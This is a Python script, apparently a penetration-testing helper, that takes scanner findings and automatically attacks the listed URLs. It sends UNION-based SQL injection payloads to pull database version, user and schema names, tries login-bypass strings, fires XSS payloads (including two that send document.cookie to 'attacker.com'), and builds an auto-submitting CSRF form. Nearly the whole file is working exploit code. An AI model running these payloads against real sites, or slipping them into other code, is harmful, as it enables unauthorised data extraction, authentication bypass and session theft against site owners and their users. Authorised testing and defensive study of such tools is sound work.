#!/usr/bin/env python3
"""
Exploit Validator Tool
Automatically performs SQL Injection and XSS exploitation to prove vulnerabilities
Reads vulnerabilities from scanner output and validates exploitability
Outputs exploitation results to CSV format
"""

import requests
import csv
import argparse
import sys
import os
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse, urlencode
from bs4 import BeautifulSoup
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class ExploitValidator:
    def __init__(self, target_url, vulnerabilities_file, output_file, demo_mode=False):
        self.target_url = target_url
        self.vulnerabilities_file = vulnerabilities_file
        self.output_file = output_file
        self.demo_mode = demo_mode
        self.exploits = []
        self.session = requests.Session()
        self.session.verify = False
        
        # Track successful exploits by type (limit to 5 per type)
        self.successful_exploits_count = {
            'SQL Injection': 0,
            'Cross-Site Scripting (XSS)': 0,
            'Cross-Site Request Forgery (CSRF)': 0
        }
        
        # Advanced SQL Injection payloads for exploitation
        self.sql_exploit_payloads = {
            'mysql': [
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT NULL,@@version,NULL,NULL,NULL--",
                "' UNION SELECT NULL,user(),NULL,NULL,NULL--",
                "' UNION SELECT NULL,database(),NULL,NULL,NULL--",
                "' UNION SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables--",
                "' UNION SELECT NULL,column_name,NULL,NULL,NULL FROM information_schema.columns--",
            ],
            'postgresql': [
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,version(),NULL,NULL,NULL--",
                "' UNION SELECT NULL,current_user,NULL,NULL,NULL--",
                "' UNION SELECT NULL,current_database(),NULL,NULL,NULL--",
            ],
            'mssql': [
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,@@version,NULL,NULL,NULL--",
                "' UNION SELECT NULL,user_name(),NULL,NULL,NULL--",
                "' UNION SELECT NULL,db_name(),NULL,NULL,NULL--",
            ],
            'generic': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' OR '1'='1",
                "admin'--",
            ]
        }
        
        # Advanced XSS payloads for exploitation
        self.xss_exploit_payloads = [
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg/onload=alert(document.domain)>",
            "<iframe src=javascript:alert(document.domain)>",
            "<body onload=alert(document.domain)>",
            "\"><script>alert(document.domain)</script>",
            "'><script>alert(document.domain)</script>",
            "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>",
            "<img src=x onerror=fetch('https://attacker.com?cookie='+document.cookie)>",
        ]
    
    def load_vulnerabilities(self):
        """Load vulnerabilities from CSV file"""
        print(f"[*] Loading vulnerabilities from {self.vulnerabilities_file}")
        
        vulnerabilities = []
        
        try:
            with open(self.vulnerabilities_file, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    vulnerabilities.append(row)
            
            print(f"[+] Loaded {len(vulnerabilities)} vulnerabilities")
            return vulnerabilities
        
        except Exception as e:
            print(f"[!] Error loading vulnerabilities: {str(e)}")
            return []
    
    def add_exploit(self, vuln_type, status, url, parameter, payload, result, 
                   data_extracted, description):
        """Add an exploitation result"""
        self.exploits.append({
            'Type': vuln_type,
            'Status': status,
            'URL': url,
            'Parameter': parameter,
            'Payload': payload,
            'Result': result[:500],  # Limit result length
            'Data Extracted': data_extracted,
            'Description': description,
            'Timestamp': datetime.now().isoformat()
        })
    
    def exploit_sql_injection(self, vulnerability):
        """Attempt to exploit SQL injection vulnerability"""
        print(f"[*] Exploiting SQL Injection: {vulnerability['URL']} (Parameter: {vulnerability['Parameter']})")
        
        # Check if we've reached the limit for this type
        if self.successful_exploits_count['SQL Injection'] >= 5:
            print(f"[*] Skipping - Already have 5 successful SQL Injection exploits")
            return False
        
        url = vulnerability['URL']
        parameter = vulnerability['Parameter']
        
        # Try different database-specific payloads
        for db_type, payloads in self.sql_exploit_payloads.items():
            for payload in payloads:
                try:
                    # Check if it's a URL parameter or form parameter
                    if '?' in url:
                        # URL parameter
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        
                        if parameter in params or parameter == 'N/A':
                            # If parameter is N/A, try all parameters
                            test_params = params.copy()
                            
                            if parameter == 'N/A':
                                # Test first parameter
                                first_param = list(params.keys())[0] if params else None
                                if first_param:
                                    test_params[first_param] = [payload]
                                else:
                                    continue
                            else:
                                test_params[parameter] = [payload]
                            
                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                                  parsed.params, new_query, parsed.fragment))
                            
                            response = self.session.get(test_url, timeout=10)
                    else:
                        # Form parameter (simulate POST)
                        data = {parameter: payload}
                        response = self.session.post(url, data=data, timeout=10)
                    
                    # Check for successful exploitation indicators
                    success_indicators = [
                        r'\d+\.\d+\.\d+',  # Version numbers
                        r'mysql',
                        r'postgresql',
                        r'microsoft sql server',
                        r'oracle',
                        r'root@localhost',
                        r'table_name',
                        r'column_name',
                        r'information_schema',
                    ]
                    
                    response_lower = response.text.lower()
                    extracted_data = []
                    
                    for indicator in success_indicators:
                        matches = re.findall(indicator, response_lower, re.IGNORECASE)
                        if matches:
                            extracted_data.extend(matches[:5])  # Limit to 5 matches per indicator
                    
                    if extracted_data:
                        # Clean and format extracted data
                        cleaned_data = list(set(extracted_data))[:10]  # Remove duplicates, limit to 10
                        data_summary = ', '.join(cleaned_data)
                        
                        self.add_exploit(
                            vuln_type='SQL Injection',
                            status='Exploited Successfully',
                            url=url,
                            parameter=parameter,
                            payload=payload,
                            result=f"Database Type: {db_type}, Extracted Data: {data_summary}",
                            data_extracted=data_summary,
                            description=f"SQL Injection exploited successfully using {db_type} payload. Extracted: {', '.join(cleaned_data[:3])}"
                        )
                        self.successful_exploits_count['SQL Injection'] += 1
                        print(f"[+] SQL Injection exploited! Data extracted: {', '.join(cleaned_data[:3])} ({self.successful_exploits_count['SQL Injection']}/5)")
                        return True
                    
                    # Check if query executed without errors (authentication bypass)
                    if response.status_code == 200 and len(response.text) > 100:
                        # Check for common success indicators
                        if any(word in response_lower for word in ['welcome', 'dashboard', 'logout', 'profile', 'admin']):
                            # Extract useful information from response
                            soup = BeautifulSoup(response.text, 'html.parser')
                            
                            # Try to extract user information or page title
                            page_title = soup.title.string if soup.title else 'Unknown'
                            
                            # Look for user info in the page
                            user_indicators = []
                            for text in soup.stripped_strings:
                                text_lower = text.lower()
                                if any(keyword in text_lower for keyword in ['welcome', 'logged in as', 'user:', 'username:']):
                                    user_indicators.append(text[:50])
                            
                            result_summary = f"Auth Bypass Successful - Page: {page_title}"
                            if user_indicators:
                                result_summary += f", User Info: {'; '.join(user_indicators[:2])}"
                            
                            self.add_exploit(
                                vuln_type='SQL Injection',
                                status='Exploited Successfully (Auth Bypass)',
                                url=url,
                                parameter=parameter,
                                payload=payload,
                                result=result_summary,
                                data_extracted='Authentication bypassed - Access granted to protected page',
                                description=f"SQL Injection exploited for authentication bypass. Successfully accessed protected area."
                            )
                            self.successful_exploits_count['SQL Injection'] += 1
                            print(f"[+] SQL Injection exploited! Authentication bypassed ({self.successful_exploits_count['SQL Injection']}/5)")
                            return True
                
                except Exception as e:
                    continue
        
        # If no exploitation successful
        self.add_exploit(
            vuln_type='SQL Injection',
            status='Exploitation Failed',
            url=url,
            parameter=parameter,
            payload='Multiple payloads tested',
            result='No successful exploitation',
            data_extracted='N/A',
            description='Vulnerability detected but exploitation was not successful'
        )
        print(f"[-] SQL Injection exploitation failed")
        return False
    def exploit_xss(self, vulnerability):
        """Attempt to exploit XSS vulnerability"""
        print(f"[*] Exploiting XSS: {vulnerability['URL']} (Parameter: {vulnerability['Parameter']})")
        
        # Check if we've reached the limit for this type
        if self.successful_exploits_count['Cross-Site Scripting (XSS)'] >= 5:
            print(f"[*] Skipping - Already have 5 successful XSS exploits")
            return False
        
        url = vulnerability['URL']
        parameter = vulnerability['Parameter']
        
        for payload in self.xss_exploit_payloads:
            try:
                # Check if it's a URL parameter or form parameter
                if '?' in url:
                    # URL parameter
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    
                    if parameter in params or parameter == 'N/A':
                        test_params = params.copy()
                        
                        if parameter == 'N/A':
                            first_param = list(params.keys())[0] if params else None
                            if first_param:
                                test_params[first_param] = [payload]
                            else:
                                continue
                        else:
                            test_params[parameter] = [payload]
                        
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                              parsed.params, new_query, parsed.fragment))
                        
                        response = self.session.get(test_url, timeout=10)
                else:
                    # Form parameter (simulate POST)
                    data = {parameter: payload}
                    response = self.session.post(url, data=data, timeout=10)
                
                # Check if payload is reflected without encoding/filtering
                if payload in response.text:
                    # Check if it's in executable context
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Check if payload is in script tags or event handlers
                    scripts = soup.find_all('script')
                    payload_in_script = any(payload in str(script) for script in scripts)
                    
                    # Check for event handlers
                    payload_in_handler = 'onerror=' in response.text or 'onload=' in response.text
                    
                    if payload_in_script or payload_in_handler or '<script>' in response.text:
                        # Extract context information instead of full HTML
                        context_info = f"Payload: {payload[:50]}, Context: "
                        if payload_in_script:
                            context_info += "Injected in <script> tag"
                        elif payload_in_handler:
                            context_info += "Injected in event handler"
                        else:
                            context_info += "Reflected in HTML"
                        
                        # Check for potential data leakage
                        if 'cookie' in payload.lower():
                            context_info += ", Cookie theft possible"
                        if 'domain' in payload.lower():
                            context_info += ", Domain info accessible"
                        
                        self.add_exploit(
                            vuln_type='Cross-Site Scripting (XSS)',
                            status='Exploited Successfully',
                            url=url,
                            parameter=parameter,
                            payload=payload,
                            result=context_info,
                            data_extracted='XSS payload executed - Can steal cookies, session tokens, or perform actions as victim',
                            description='XSS vulnerability exploited. Payload reflected in executable context. Attacker can execute arbitrary JavaScript.'
                        )
                        self.successful_exploits_count['Cross-Site Scripting (XSS)'] += 1
                        print(f"[+] XSS exploited successfully! ({self.successful_exploits_count['Cross-Site Scripting (XSS)']}/5)")
                        return True
                    else:
                        # Find where the payload is reflected
                        reflection_context = "Unknown"
                        if payload in response.text:
                            # Find the surrounding context
                            idx = response.text.find(payload)
                            context_start = max(0, idx - 50)
                            context_end = min(len(response.text), idx + len(payload) + 50)
                            reflection_context = response.text[context_start:context_end].replace('\n', ' ')
                        
                        self.add_exploit(
                            vuln_type='Cross-Site Scripting (XSS)',
                            status='Partially Exploited',
                            url=url,
                            parameter=parameter,
                            payload=payload,
                            result=f"Payload reflected in: {reflection_context[:200]}",
                            data_extracted='Payload reflected but may be filtered or in non-executable context',
                            description='XSS payload reflected but may require context-specific payload or encoding bypass'
                        )
                        self.successful_exploits_count['Cross-Site Scripting (XSS)'] += 1
                        print(f"[~] XSS partially exploited (payload reflected) ({self.successful_exploits_count['Cross-Site Scripting (XSS)']}/5)")
                        return True
            
            except Exception as e:
                continue
        
        # If no exploitation successful
        self.add_exploit(
            vuln_type='Cross-Site Scripting (XSS)',
            status='Exploitation Failed',
            url=url,
            parameter=parameter,
            payload='Multiple payloads tested',
            result='No successful exploitation',
            data_extracted='N/A',
            description='Vulnerability detected but exploitation was not successful'
        )
        print(f"[-] XSS exploitation failed")
        return False
    
    def exploit_csrf(self, vulnerability):
        """Generate CSRF proof-of-concept"""
        print(f"[*] Generating CSRF PoC: {vulnerability['URL']}")
        
        # Check if we've reached the limit for this type
        if self.successful_exploits_count['Cross-Site Request Forgery (CSRF)'] >= 5:
            print(f"[*] Skipping - Already have 5 successful CSRF PoCs")
            return False
        
        url = vulnerability['URL']
        
        # Generate HTML PoC for CSRF
        csrf_poc = f"""
        <html>
          <body>
            <h1>CSRF Proof of Concept</h1>
            <form action="{url}" method="POST" id="csrf-form">
              <input type="hidden" name="action" value="malicious_action">
              <input type="hidden" name="value" value="attacker_controlled">
            </form>
            <script>
              document.getElementById('csrf-form').submit();
            </script>
          </body>
        </html>
        """
        
        self.add_exploit(
            vuln_type='Cross-Site Request Forgery (CSRF)',
            status='PoC Generated',
            url=url,
            parameter='N/A',
            payload='N/A',
            result=csrf_poc,
            data_extracted='CSRF PoC HTML generated',
            description='CSRF vulnerability confirmed. PoC HTML generated for demonstration.'
        )
        self.successful_exploits_count['Cross-Site Request Forgery (CSRF)'] += 1
        print(f"[+] CSRF PoC generated ({self.successful_exploits_count['Cross-Site Request Forgery (CSRF)']}/5)")
        return True
    
    def save_to_csv(self):
        """Save exploitation results to CSV"""
        if not self.exploits:
            print("[!] No exploitation results to save")
            return False
        
        try:
            # Ensure output directory exists
            os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
            
            # Write to CSV
            with open(self.output_file, 'w', newline='', encoding='utf-8') as f:
                fieldnames = ['Type', 'Status', 'URL', 'Parameter', 'Payload',
                            'Result', 'Data Extracted', 'Description', 'Timestamp']
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                
                writer.writeheader()
                writer.writerows(self.exploits)
            
            print(f"[+] Results saved to {self.output_file}")
            return True
        except Exception as e:
            print(f"[!] Error saving to CSV: {str(e)}")
            return False
    
    def run(self):
        """Main execution method"""
        print("="*60)
        print("Exploit Validator Tool")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Vulnerabilities File: {self.vulnerabilities_file}")
        print(f"Output: {self.output_file}")
        print("="*60)
        
        # Load vulnerabilities
        vulnerabilities = self.load_vulnerabilities()
        
        if not vulnerabilities:
            print("[!] No vulnerabilities to exploit")
            return False
        
        # Apply demo mode limit if enabled
        if self.demo_mode:
            original_count = len(vulnerabilities)
            vulnerabilities = vulnerabilities[:10]
            print(f"\n[*] DEMO MODE: Testing only {len(vulnerabilities)} out of {original_count} vulnerabilities")
            print("="*60)
        
        # Process each vulnerability
        for vuln in vulnerabilities:
            vuln_type = vuln.get('Type', '')
            
            if 'SQL Injection' in vuln_type:
                self.exploit_sql_injection(vuln)
            
            elif 'XSS' in vuln_type or 'Cross-Site Scripting' in vuln_type:
                self.exploit_xss(vuln)
            
            elif 'CSRF' in vuln_type:
                self.exploit_csrf(vuln)
            
            else:
                # Log other vulnerabilities without exploitation
                self.add_exploit(
                    vuln_type=vuln_type,
                    status='Not Exploited',
                    url=vuln.get('URL', ''),
                    parameter=vuln.get('Parameter', 'N/A'),
                    payload='N/A',
                    result='N/A',
                    data_extracted='N/A',
                    description=f'{vuln_type} vulnerability - no automatic exploitation available'
                )
        
        # Save results
        print("\n" + "="*60)
        print(f"Exploitation completed!")
        print(f"Total exploits attempted: {len(self.exploits)}")
        
        # Count by status
        successful = sum(1 for e in self.exploits if 'Successfully' in e['Status'])
        failed = sum(1 for e in self.exploits if 'Failed' in e['Status'])
        poc = sum(1 for e in self.exploits if 'PoC' in e['Status'])
        
        print(f"  - Successful: {successful}")
        print(f"  - Failed: {failed}")
        print(f"  - PoC Generated: {poc}")
        print("="*60)
        
        if self.save_to_csv():
            return True
        
        return False


def main():
    parser = argparse.ArgumentParser(
        description='Exploit Validator Tool - Validates vulnerabilities through exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python exploit_validator.py --url https://example.com --vulns results/vulns.csv --output results/exploits.csv
  python exploit_validator.py -u http://testsite.local -v vulns.csv -o exploits.csv
        '''
    )
    
    parser.add_argument(
        '-u', '--url',
        required=True,
        help='Target URL (e.g., https://example.com)'
    )
    
    parser.add_argument(
        '-v', '--vulns',
        required=True,
        help='Input CSV file with vulnerabilities (from scanner)'
    )
    
    parser.add_argument(
        '-o', '--output',
        required=True,
        help='Output CSV file path'
    )
    
    parser.add_argument(
        '--demo',
        action='store_true',
        help='Demo mode: Test only first 10 vulnerabilities (for quick testing)'
    )
    
    args = parser.parse_args()
    
    # Run the exploit validator
    validator = ExploitValidator(args.url, args.vulns, args.output, demo_mode=args.demo)
    success = validator.run()
    
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
